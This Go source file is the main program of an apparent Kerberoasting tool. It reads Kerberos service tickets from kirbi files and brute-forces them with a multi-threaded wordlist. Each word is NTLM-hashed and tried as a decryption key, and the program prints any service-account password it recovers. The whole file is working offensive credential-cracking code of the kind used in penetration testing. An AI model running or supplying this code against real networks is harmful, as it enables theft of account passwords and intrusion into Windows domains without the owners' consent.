package main

import (
	"context"
	"flag"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/violenttestpen/kerberoast.go/pkg/kerberos"
	"github.com/violenttestpen/kerberoast.go/pkg/util"
)

var (
	fileString   string
	files        []string
	wordlistfile string
	workers      uint
	benchmark    bool
	lazyLoad     bool
)

var ticketMutex sync.RWMutex

type ticketList struct {
	et       []byte
	i        int
	filename string
}

func main() {
	flag.StringVar(&wordlistfile, "w", "", "Wordlist to use")
	flag.StringVar(&fileString, "f", "", "Comma-separated list of paths to Kerberos tickets in kirbi format")
	flag.UintVar(&workers, "t", uint(runtime.NumCPU()), "Number of worker threads")
	flag.BoolVar(&benchmark, "b", false, "Benchmark mode")
	flag.BoolVar(&lazyLoad, "l", false, "Enable lazy loading of wordlist for low memory systems")
	flag.Parse()

	if fileString == "" {
		fmt.Println("Missing kerberos tickets")
		flag.Usage()
		return
	}

	if strings.Contains(fileString, ",") {
		files = strings.Split(fileString, ",")
	} else {
		files = []string{fileString}
	}

	encTickets := make([]ticketList, len(files))
	for i := range files {
		data, err := kerberos.ExtractTicketFromKirbi(files[i])
		util.FailOnError(err)
		encTickets[i] = ticketList{et: data, i: i, filename: files[i]}
	}

	if len(encTickets) > 0 {
		fmt.Println("Cracking", len(encTickets), "tickets...")
	} else {
		fmt.Println("No tickets found")
		return
	}

	if benchmark {
		benchmarkMode(encTickets)
		return
	}

	startTime := time.Now()

	ctx, cancel := context.WithCancel(context.Background())
	wordlist, err := util.LoadWordlist(ctx, wordlistfile, lazyLoad)
	util.FailOnError(err)

	var wg sync.WaitGroup
	wg.Add(int(workers))
	for i := uint(0); i < workers; i++ {
		go func() {
			defer wg.Done()
			k := kerberos.New()
			for word := range wordlist {
				select {
				case <-ctx.Done():
					return
				default:
					hash, err := k.NTLMHash(word)
					if err != nil {
						fmt.Println(err)
						cancel()
						return
					}

					ticketMutex.RLock()
					tickets := encTickets
					ticketMutex.RUnlock()

					for i := range tickets {
						kdata, _, err := k.Decrypt(hash, 2, tickets[i].et)
						if err != nil && err != kerberos.ErrChecksum {
							fmt.Println(err)
							cancel()
							return
						}

						if kdata != nil {
							ticketMutex.Lock()
							encTickets = append(encTickets[:i], encTickets[i+1:]...)
							ticketMutex.Unlock()

							fmt.Printf("found password for ticket %d: %s  File: %s\n", tickets[i].i, *word, tickets[i].filename)
							if len(encTickets) == 0 {
								fmt.Println("Successfully cracked all tickets")
								cancel()
								return
							}
						}
					}
				}
			}
		}()
	}
	wg.Wait()

	if len(encTickets) > 0 {
		fmt.Println("Unable to crack", len(encTickets), "tickets")
	}

	fmt.Println("Completed in", time.Since(startTime))
}
